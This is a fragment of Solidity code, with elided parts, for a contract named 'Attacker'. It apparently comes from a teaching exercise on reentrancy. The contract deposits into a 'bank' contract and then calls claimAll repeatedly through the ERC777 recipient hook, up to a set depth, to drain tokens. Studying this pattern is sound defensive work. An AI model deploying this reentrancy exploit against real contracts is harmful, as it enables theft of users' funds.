...
contract Attacker is AccessControl, IERC777Recipient {
	...
	*/
    ...
    //step 1 deposit the given amount into the bank
		bank.deposit{value: amt}();
		emit Deposit(amt);
    //step 2 set depth to zero
		depth = 0;
    //step 3 trigger a claimAll of the ERC777 token 
		bank.claimAll();
	...
	*/
    ...
    // increase depth by 1
		depth +=1;
    // if depth is less than max depth then trigger a bank claimAll
		if (depth < max_depth){
			emit Recurse(depth);
			bank.claimAll();
		} 
